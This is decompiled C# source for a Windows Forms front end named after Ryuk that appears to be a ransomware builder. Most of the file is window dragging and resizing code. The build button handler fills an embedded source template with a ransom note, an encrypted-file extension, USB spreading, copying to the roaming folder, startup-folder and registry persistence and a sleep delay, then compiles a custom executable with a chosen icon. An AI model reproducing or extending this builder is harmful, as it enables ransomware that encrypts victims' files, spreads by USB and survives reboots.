using System;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Ryuk.Net.Properties;

namespace CustomWindowsForm;

public class BlackForm : Form
{
	private bool isTopPanelDragged = false;

	private bool isLeftPanelDragged = false;

	private bool isRightPanelDragged = false;

	private bool isBottomPanelDragged = false;

	private bool isTopBorderPanelDragged = false;

	private bool isRightBottomPanelDragged = false;

	private bool isLeftBottomPanelDragged = false;

	private bool isRightTopPanelDragged = false;

	private bool isLeftTopPanelDragged = false;

	private bool isWindowMaximized = false;

	private Point offset;

	private Size _normalWindowSize;

	private Point _normalWindowLocation = Point.Empty;

	private string iconLocation = "";

	private IContainer components = null;

	private Panel TopBorderPanel;

	private Panel RightPanel;

	private Panel LeftPanel;

	private Panel BottomPanel;

	private Panel TopPanel;

	private ButtonZ _CloseButton;

	private Panel RightBottomPanel_1;

	private Label WindowTextLabel;

	private MinMaxButton _MaxButton;

	private Panel panel2;

	private ButtonZ _MinButton;

	private Panel RightBottomPanel_2;

	private Panel LeftBottomPanel_1;

	private Panel LeftBottomPanel_2;

	private Panel RightTopPanel_1;

	private Panel RightTopPanel_2;

	private Panel LeftTopPanel_1;

	private Panel LeftTopPanel_2;

	private ShapedButton shapedButton4;

	private CheckBox usbSpreadCheckBox;

	private TextBox textBox1;

	private ShapedButton shapedButton3;

	private SaveFileDialog saveFileDialog1;

	private CheckBox checkBox1;

	private TextBox textBox2;

	private TextBox spreadNameText;

	private CheckBox checkBox2;

	private TextBox textBox4;

	private CheckBox registryStartupcheckBox;

	private CheckBox startupcheckBox3;

	private OpenFileDialog openFileDialog1;

	private PictureBox pictureBox1;

	private Label selectIconLabel;

	private CheckBox sleepCheckBox;

	private TextBox SleepTextBox;

	public BlackForm()
	{
		InitializeComponent();
	}

	private void BlackForm_Load(object sender, EventArgs e)
	{
	}

	private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isTopBorderPanelDragged = true;
		}
		else
		{
			isTopBorderPanelDragged = false;
		}
	}

	private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Y < ((Form)this).Location.Y && isTopBorderPanelDragged)
		{
			if (((Control)this).Height < 50)
			{
				((Control)this).Height = 50;
				isTopBorderPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X, ((Form)this).Location.Y + e.Y);
				((Control)this).Height = ((Control)this).Height - e.Y;
			}
		}
	}

	private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopBorderPanelDragged = false;
	}

	private void TopPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isTopPanelDragged = true;
			Point point = ((Control)this).PointToScreen(new Point(e.X, e.Y));
			offset = default(Point);
			offset.X = ((Form)this).Location.X - point.X;
			offset.Y = ((Form)this).Location.Y - point.Y;
		}
		else
		{
			isTopPanelDragged = false;
		}
		if (e.Clicks == 2)
		{
			isTopPanelDragged = false;
			_MaxButton_Click(sender, (EventArgs)(object)e);
		}
	}

	private void TopPanel_MouseMove(object sender, MouseEventArgs e)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Invalid comparison between Unknown and I4
		if (isTopPanelDragged)
		{
			Point location = ((Control)TopPanel).PointToScreen(new Point(e.X, e.Y));
			location.Offset(offset);
			((Form)this).Location = location;
			if ((((Form)this).Location.X > 2 || ((Form)this).Location.Y > 2) && (int)((Form)this).WindowState == 2)
			{
				((Form)this).Location = _normalWindowLocation;
				((Form)this).Size = _normalWindowSize;
				_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				isWindowMaximized = false;
			}
		}
	}

	private void TopPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopPanelDragged = false;
		if (((Form)this).Location.Y <= 5 && !isWindowMaximized)
		{
			_normalWindowSize = ((Form)this).Size;
			_normalWindowLocation = ((Form)this).Location;
			Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
			((Form)this).Location = new Point(0, 0);
			((Form)this).Size = new Size(workingArea.Width, workingArea.Height);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Invalid comparison between Unknown and I4
		if (((Form)this).Location.X <= 0 || e.X < 0)
		{
			isLeftPanelDragged = false;
			((Form)this).Location = new Point(10, ((Form)this).Location.Y);
		}
		else if ((int)e.Button == 1048576)
		{
			isLeftPanelDragged = true;
		}
		else
		{
			isLeftPanelDragged = false;
		}
	}

	private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.X < ((Form)this).Location.X && isLeftPanelDragged)
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				isLeftPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
			}
		}
	}

	private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftPanelDragged = false;
	}

	private void RightPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isRightPanelDragged = true;
		}
		else
		{
			isRightPanelDragged = false;
		}
	}

	private void RightPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightPanelDragged)
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				isRightPanelDragged = false;
			}
			else
			{
				((Control)this).Width = ((Control)this).Width + e.X;
			}
		}
	}

	private void RightPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isRightPanelDragged = false;
	}

	private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isBottomPanelDragged = true;
		}
		else
		{
			isBottomPanelDragged = false;
		}
	}

	private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isBottomPanelDragged)
		{
			if (((Control)this).Height < 50)
			{
				((Control)this).Height = 50;
				isBottomPanelDragged = false;
			}
			else
			{
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isBottomPanelDragged = false;
	}

	private void _MinButton_Click(object sender, EventArgs e)
	{
		((Form)this).WindowState = (FormWindowState)1;
	}

	private void _MaxButton_Click(object sender, EventArgs e)
	{
		if (isWindowMaximized)
		{
			((Form)this).Location = _normalWindowLocation;
			((Form)this).Size = _normalWindowSize;
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
			isWindowMaximized = false;
		}
		else
		{
			_normalWindowSize = ((Form)this).Size;
			_normalWindowLocation = ((Form)this).Location;
			Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
			((Form)this).Location = new Point(0, 0);
			((Form)this).Size = new Size(workingArea.Width, workingArea.Height);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void _CloseButton_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = true;
	}

	private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightBottomPanelDragged)
		{
			if (((Control)this).Width < 100 || ((Control)this).Height < 50)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 50;
				isRightBottomPanelDragged = false;
			}
			else
			{
				((Control)this).Width = ((Control)this).Width + e.X;
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = false;
	}

	private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseDown(sender, e);
	}

	private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseMove(sender, e);
	}

	private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseUp(sender, e);
	}

	private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = true;
	}

	private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.X < ((Form)this).Location.X && (isLeftBottomPanelDragged || ((Control)this).Height < 50))
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 50;
				isLeftBottomPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = false;
	}

	private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseDown(sender, e);
	}

	private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseMove(sender, e);
	}

	private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseUp(sender, e);
	}

	private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = true;
	}

	private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.Y < ((Form)this).Location.Y || e.X < ((Form)this).Location.X) && isRightTopPanelDragged)
		{
			if (((Control)this).Height < 50 || ((Control)this).Width < 100)
			{
				((Control)this).Height = 50;
				((Control)this).Width = 100;
				isRightTopPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X, ((Form)this).Location.Y + e.Y);
				((Control)this).Height = ((Control)this).Height - e.Y;
				((Control)this).Width = ((Control)this).Width + e.X;
			}
		}
	}

	private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = false;
	}

	private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseDown(sender, e);
	}

	private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseMove(sender, e);
	}

	private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseUp(sender, e);
	}

	private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = true;
	}

	private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.X < ((Form)this).Location.X || e.Y < ((Form)this).Location.Y) && isLeftTopPanelDragged)
		{
			if (((Control)this).Width < 100 || ((Control)this).Height < 50)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 100;
				isLeftTopPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
				((Form)this).Location = new Point(((Form)this).Location.X, ((Form)this).Location.Y + e.Y);
				((Control)this).Height = ((Control)this).Height - e.Y;
			}
		}
	}

	private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = false;
	}

	private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseDown(sender, e);
	}

	private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseMove(sender, e);
	}

	private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseUp(sender, e);
	}

	private void file_button_Click(object sender, EventArgs e)
	{
	}

	private void edit_button_Click(object sender, EventArgs e)
	{
	}

	private void view_button_Click(object sender, EventArgs e)
	{
	}

	private void run_button_Click(object sender, EventArgs e)
	{
	}

	private void help_button_Click(object sender, EventArgs e)
	{
	}

	private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
	{
		TopPanel_MouseDown(sender, e);
	}

	private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
	{
		TopPanel_MouseMove(sender, e);
	}

	private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
	{
		TopPanel_MouseUp(sender, e);
	}

	private void shapedButton3_Click(object sender, EventArgs e)
	{
		Form2 form = new Form2();
		((Control)form).Show();
	}

	private void shapedButton4_Click(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_025f: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fe: Expected O, but got Unknown
		//IL_040e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0414: Invalid comparison between Unknown and I4
		if (((Control)textBox1).Text.Trim().Length < 1)
		{
			MessageBox.Show("Please type your message!", "Read_it.txt", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		if (string.IsNullOrWhiteSpace("aa"))
		{
			MessageBox.Show("All fields are required", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < ((TextBoxBase)textBox1).Lines.Length; i++)
		{
			stringBuilder.Append("\"" + ((TextBoxBase)textBox1).Lines[i] + "\",\n");
		}
		string source = Resources.Source;
		source = source.Replace("#messages", stringBuilder.ToString());
		if (checkBox1.Checked)
		{
			source = source.Replace("#encryptedFileExtension", "");
		}
		else
		{
			string text = ((Control)textBox2).Text;
			if (text.StartsWith("."))
			{
				text = text.Substring(1);
			}
			source = source.Replace("#encryptedFileExtension", text);
		}
		if (checkBox2.Checked)
		{
			if (((Control)textBox4).Text.Trim().Length < 1)
			{
				MessageBox.Show("Proccess name field is empty");
				return;
			}
			if (((Control)textBox4).Text.EndsWith(".exe"))
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).Text);
			}
			else
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).Text + ".exe");
			}
		}
		else
		{
			source = source.Replace("#copyRoaming", "false");
			source = source.Replace("#exeName", ((Control)textBox4).Text);
		}
		if (usbSpreadCheckBox.Checked)
		{
			if (((Control)spreadNameText).Text.Trim().Length < 1)
			{
				MessageBox.Show("Usb spread name field is empty");
				return;
			}
			if (((Control)spreadNameText).Text.EndsWith(".exe"))
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).Text);
			}
			else
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).Text + ".exe");
			}
		}
		else
		{
			source = source.Replace("#checkSpread", "false");
			source = source.Replace("#spreadName", ((Control)spreadNameText).Text);
		}
		source = ((!startupcheckBox3.Checked) ? source.Replace("#startupFolder", "false") : source.Replace("#startupFolder", "true"));
		source = ((!registryStartupcheckBox.Checked) ? source.Replace("#registryStartup", "false") : source.Replace("#registryStartup", "true"));
		if (sleepCheckBox.Checked)
		{
			source = source.Replace("#checkSleep", "true");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).Text);
		}
		else
		{
			source = source.Replace("#checkSleep", "false");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).Text);
		}
		SaveFileDialog val = new SaveFileDialog();
		try
		{
			((FileDialog)val).Filter = "Executable (*.exe)|*.exe";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				new Compiler(source, ((FileDialog)val).FileName, iconLocation);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
	{
	}

	private void panel2_Paint(object sender, PaintEventArgs e)
	{
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox2).Enabled)
		{
			((Control)textBox2).Enabled = true;
		}
		else
		{
			((Control)textBox2).Enabled = false;
		}
	}

	private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)spreadNameText).Enabled)
		{
			((Control)spreadNameText).Enabled = true;
		}
		else
		{
			((Control)spreadNameText).Enabled = false;
		}
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox4).Enabled)
		{
			((Control)textBox4).Enabled = true;
		}
		else
		{
			((Control)textBox4).Enabled = false;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).Filter = "Icons (*.ico)|*.ico";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).FileName;
				pictureBox1.Image = (Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).FileName, new Size(60, 60)).Handle);
				((Control)selectIconLabel).Text = "";
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void selectIconLabel_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).Filter = "Icons (*.ico)|*.ico";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).FileName;
				pictureBox1.Image = (Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).FileName, new Size(60, 60)).Handle);
				((Control)selectIconLabel).Text = "";
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)SleepTextBox).Enabled)
		{
			((Control)SleepTextBox).Enabled = true;
		}
		else
		{
			((Control)SleepTextBox).Enabled = false;
		}
	}

	private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
	{
		if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
		{
			e.Handled = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_0243: Unknown result type (might be due to invalid IL or missing references)
		//IL_024d: Expected O, but got Unknown
		//IL_025b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0265: Expected O, but got Unknown
		//IL_0273: Unknown result type (might be due to invalid IL or missing references)
		//IL_027d: Expected O, but got Unknown
		//IL_0308: Unknown result type (might be due to invalid IL or missing references)
		//IL_0312: Expected O, but got Unknown
		//IL_0320: Unknown result type (might be due to invalid IL or missing references)
		//IL_032a: Expected O, but got Unknown
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_0342: Expected O, but got Unknown
		//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d2: Expected O, but got Unknown
		//IL_03e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ea: Expected O, but got Unknown
		//IL_03f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0402: Expected O, but got Unknown
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0497: Expected O, but got Unknown
		//IL_04a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04af: Expected O, but got Unknown
		//IL_04bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Expected O, but got Unknown
		//IL_059e: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a8: Expected O, but got Unknown
		//IL_05b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c0: Expected O, but got Unknown
		//IL_05ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d8: Expected O, but got Unknown
		//IL_062f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0639: Expected O, but got Unknown
		//IL_0863: Unknown result type (might be due to invalid IL or missing references)
		//IL_086d: Expected O, but got Unknown
		//IL_08e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f1: Expected O, but got Unknown
		//IL_08ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0909: Expected O, but got Unknown
		//IL_0917: Unknown result type (might be due to invalid IL or missing references)
		//IL_0921: Expected O, but got Unknown
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_0982: Expected O, but got Unknown
		//IL_0ae9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af3: Expected O, but got Unknown
		//IL_0b01: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b0b: Expected O, but got Unknown
		//IL_0b19: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b23: Expected O, but got Unknown
		//IL_0cf5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cff: Expected O, but got Unknown
		//IL_0df3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dfd: Expected O, but got Unknown
		//IL_0e86: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e90: Expected O, but got Unknown
		//IL_1158: Unknown result type (might be due to invalid IL or missing references)
		//IL_1162: Expected O, but got Unknown
		//IL_1237: Unknown result type (might be due to invalid IL or missing references)
		//IL_1241: Expected O, but got Unknown
		//IL_12ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f8: Expected O, but got Unknown
		//IL_1468: Unknown result type (might be due to invalid IL or missing references)
		//IL_1472: Expected O, but got Unknown
		//IL_153b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1545: Expected O, but got Unknown
		//IL_16a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_16b3: Expected O, but got Unknown
		//IL_18d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_18e3: Expected O, but got Unknown
		//IL_1ab2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1abc: Expected O, but got Unknown
		//IL_1aca: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ad4: Expected O, but got Unknown
		//IL_1ae2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aec: Expected O, but got Unknown
		//IL_1b73: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b7d: Expected O, but got Unknown
		//IL_1b8b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b95: Expected O, but got Unknown
		//IL_1ba3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bad: Expected O, but got Unknown
		//IL_1c34: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c3e: Expected O, but got Unknown
		//IL_1c4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c56: Expected O, but got Unknown
		//IL_1c64: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c6e: Expected O, but got Unknown
		//IL_1cf6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d00: Expected O, but got Unknown
		//IL_1d0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d18: Expected O, but got Unknown
		//IL_1d26: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d30: Expected O, but got Unknown
		//IL_1db8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc2: Expected O, but got Unknown
		//IL_1dd0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dda: Expected O, but got Unknown
		//IL_1de8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1df2: Expected O, but got Unknown
		//IL_1e68: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e72: Expected O, but got Unknown
		//IL_1e80: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e8a: Expected O, but got Unknown
		//IL_1e98: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ea2: Expected O, but got Unknown
		//IL_1f18: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f22: Expected O, but got Unknown
		//IL_1f30: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f3a: Expected O, but got Unknown
		//IL_1f48: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f52: Expected O, but got Unknown
		//IL_1f98: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fa2: Expected O, but got Unknown
		//IL_21cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_21d7: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(BlackForm));
		TopBorderPanel = new Panel();
		RightPanel = new Panel();
		LeftPanel = new Panel();
		BottomPanel = new Panel();
		TopPanel = new Panel();
		_MinButton = new ButtonZ();
		_MaxButton = new MinMaxButton();
		WindowTextLabel = new Label();
		_CloseButton = new ButtonZ();
		RightBottomPanel_1 = new Panel();
		panel2 = new Panel();
		sleepCheckBox = new CheckBox();
		SleepTextBox = new TextBox();
		selectIconLabel = new Label();
		pictureBox1 = new PictureBox();
		registryStartupcheckBox = new CheckBox();
		startupcheckBox3 = new CheckBox();
		textBox4 = new TextBox();
		checkBox2 = new CheckBox();
		spreadNameText = new TextBox();
		checkBox1 = new CheckBox();
		textBox2 = new TextBox();
		usbSpreadCheckBox = new CheckBox();
		shapedButton4 = new ShapedButton();
		shapedButton3 = new ShapedButton();
		RightBottomPanel_2 = new Panel();
		LeftBottomPanel_1 = new Panel();
		LeftBottomPanel_2 = new Panel();
		RightTopPanel_1 = new Panel();
		RightTopPanel_2 = new Panel();
		LeftTopPanel_1 = new Panel();
		LeftTopPanel_2 = new Panel();
		textBox1 = new TextBox();
		saveFileDialog1 = new SaveFileDialog();
		openFileDialog1 = new OpenFileDialog();
		((Control)TopPanel).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TopBorderPanel).Anchor = (AnchorStyles)13;
		((Control)TopBorderPanel).BackColor = Color.Black;
		((Control)TopBorderPanel).Cursor = Cursors.SizeNS;
